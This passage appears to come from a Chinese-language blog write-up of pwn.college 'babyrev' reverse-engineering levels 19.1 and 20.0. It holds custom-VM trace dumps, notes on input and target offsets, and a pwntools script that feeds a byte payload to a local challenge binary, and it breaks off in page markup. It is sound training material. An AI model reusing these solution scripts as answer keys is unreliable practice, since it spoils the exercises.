s:<span class="hljs-number">5</span> i:da f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x204b1</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">0</span> d:b1 s:<span class="hljs-number">5</span> i:db f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x41104</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">76</span> c:<span class="hljs-number">0</span> d:b1 s:<span class="hljs-number">5</span> i:b2 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x24001</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">1</span> c:<span class="hljs-number">0</span> d:b1 s:<span class="hljs-number">5</span> i:b3 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x14008</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:b1 s:<span class="hljs-number">5</span> i:b4 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x20449</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">49</span> s:<span class="hljs-number">5</span> i:b5 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">49</span> s:<span class="hljs-number">6</span> i:b6 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x2044e</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">4</span>e s:<span class="hljs-number">6</span> i:b7 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">4</span>e s:<span class="hljs-number">7</span> i:b8 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x20443</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">43</span> s:<span class="hljs-number">7</span> i:b9 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">43</span> s:<span class="hljs-number">8</span> i:ba f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x2044f</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">4</span>f s:<span class="hljs-number">8</span> i:bb f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">4</span>f s:<span class="hljs-number">9</span> i:bc f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x20452</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">52</span> s:<span class="hljs-number">9</span> i:bd f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">52</span> s:a i:be f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x20452</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">52</span> s:a i:bf f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">52</span> s:b i:c0 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x20445</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">45</span> s:b i:c1 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">45</span> s:c i:c2 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x20443</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">43</span> s:c i:c3 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">43</span> s:d i:c4 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x20454</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">54</span> s:d i:c5 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">54</span> s:e i:c6 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x20421</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">21</span> s:e i:c7 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">21</span> s:f i:c8 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x2040a</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:a s:f i:c9 f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x800004</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:<span class="hljs-number">0</span> d:a s:<span class="hljs-number">10</span> i:ca f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x2200b</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">38</span> b:<span class="hljs-number">6</span> c:b d:a s:<span class="hljs-number">10</span> i:cb f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x20201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:<span class="hljs-number">6</span> c:b d:a s:<span class="hljs-number">10</span> i:cc f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x100104</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:<span class="hljs-number">6</span> c:b d:b s:<span class="hljs-number">10</span> i:cd f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x20201</span><br><span class="hljs-attribute">a</span>:<span class="hljs-number">1</span> b:<span class="hljs-number">6</span> c:b d:b s:<span class="hljs-number">10</span> i:ce f:<span class="hljs-number">18</span><br><span class="hljs-attribute">0x100200</span><br></code></pre></td></tr></table></figure><p>具体的opcode对应的操作指令，可以通过19.0对应出来。那么最后，分析发现用户输入偏移为0x30，目标字符串的偏移为0x6c。然后cmp指令比较时，从0x38偏移处开始比较的，然后目标字符串从0x76开始比较的。最后做相应处理即可。exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment"># context(arch=&quot;amd64&quot;,os=&quot;linux&quot;,log_level=&quot;debug&quot;,terminal=[&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;])</span><br><span class="hljs-comment"># p = gdb.debug(&#x27;/tmp/babyrev-level-19-1&#x27;,&#x27;b *$rebase(0x1d1c)&#x27;)</span><br>p = process(<span class="hljs-string">&quot;/challenge/babyrev-level-19-1&quot;</span>)<br>al = [<span class="hljs-number">0x42</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x2d</span>, <span class="hljs-number">0xe5</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0xf7</span>, <span class="hljs-number">0xac</span>, <span class="hljs-number">0x65</span>,<span class="hljs-number">0xc2</span>, <span class="hljs-number">0x4d</span>]<br>payload = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-comment"># for i in range(len(al)):</span><br><span class="hljs-comment">#     if al[i] &gt;= 256:</span><br><span class="hljs-comment">#         payload += struct.pack(&#x27;B&#x27;, al[i] - 256)</span><br><span class="hljs-comment">#     else:</span><br><span class="hljs-comment">#         payload += struct.pack(&#x27;B&#x27;, al[i])</span><br>payload = struct.pack(<span class="hljs-string">&#x27;11B&#x27;</span>, *al)<br><span class="hljs-comment"># gdb.attach(p)</span><br><span class="hljs-comment"># pause()</span><br>p.send(payload)<br><br>z = p.readline()<br><span class="hljs-keyword">while</span>(z):<br>    <span class="hljs-built_in">print</span>(z)<br>    z = p.readline()<br><br></code></pre></td></tr></table></figure><h4 id="level20-0"><a href="#level20-0" class="headerlink" title="level20.0"></a>level20.0</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span> s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x1 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x40 arg2:<span class="hljs-number">0</span>x1e<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">b</span> = <span class="hljs-number">0</span>x1e<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x1e c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span> s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x2 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x80 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span>x40<br><span class="hljs-selector-attr">[s]</span> STK <span class="hljs-selector-tag">i</span> <span class="hljs-selector-tag">b</span><br><span class="hljs-selector-attr">[s]</span> ... pushing <span class="hljs-selector-tag">b</span><br><span class="hljs-selector-attr">[s]</span> ... popping <span class="hljs-selector-tag">i</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x1e c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span> s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x1f f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x40 arg2:<span class="hljs-number">0</span>xde<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">b</span> = <span class="hljs-number">0</span>xde<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xde c:<span class="hljs-number">0</span> d:<span class="hljs-number">0</span> s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x20 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x20 arg2:<span class="hljs-number">0</span>x5<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>x5<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xde c:<span class="hljs-number">0</span>x5 d:<span class="hljs-number">0</span> s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x21 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">a</span> = <span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xde c:<span class="hljs-number">0</span>x5 d:<span class="hljs-number">0</span> s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x22 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x2 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> SYS <span class="hljs-number">0</span>x2 d<br><span class="hljs-selector-attr">[s]</span> ... write<br>KEY: <span class="hljs-selector-attr">[s]</span> ... return value (<span class="hljs-keyword">in</span> register d): <span class="hljs-number">0</span>x5<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xde c:<span class="hljs-number">0</span>x5 d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x23 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x80 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x2<br><span class="hljs-selector-attr">[s]</span> STK NONE <span class="hljs-selector-tag">a</span><br><span class="hljs-selector-attr">[s]</span> ... pushing <span class="hljs-selector-tag">a</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xde c:<span class="hljs-number">0</span>x5 d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x24 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x80 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x40<br><span class="hljs-selector-attr">[s]</span> STK NONE <span class="hljs-selector-tag">b</span><br><span class="hljs-selector-attr">[s]</span> ... pushing <span class="hljs-selector-tag">b</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xde c:<span class="hljs-number">0</span>x5 d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x2 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x25 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x80 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x20<br><span class="hljs-selector-attr">[s]</span> STK NONE c<br><span class="hljs-selector-attr">[s]</span> ... pushing c<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>xde c:<span class="hljs-number">0</span>x5 d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x3 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x26 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x40 arg2:<span class="hljs-number">0</span>x30<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">b</span> = <span class="hljs-number">0</span>x30<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x30 c:<span class="hljs-number">0</span>x5 d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x3 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x27 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x20 arg2:<span class="hljs-number">0</span>x1b<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>x1b<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x30 c:<span class="hljs-number">0</span>x1b d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x3 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x28 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">a</span> = <span class="hljs-number">0</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x30 c:<span class="hljs-number">0</span>x1b d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x3 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x29 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x2 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> SYS <span class="hljs-number">0</span>x1 d<br><span class="hljs-selector-attr">[s]</span> ... read_memory<br><span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><p>输入后</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span 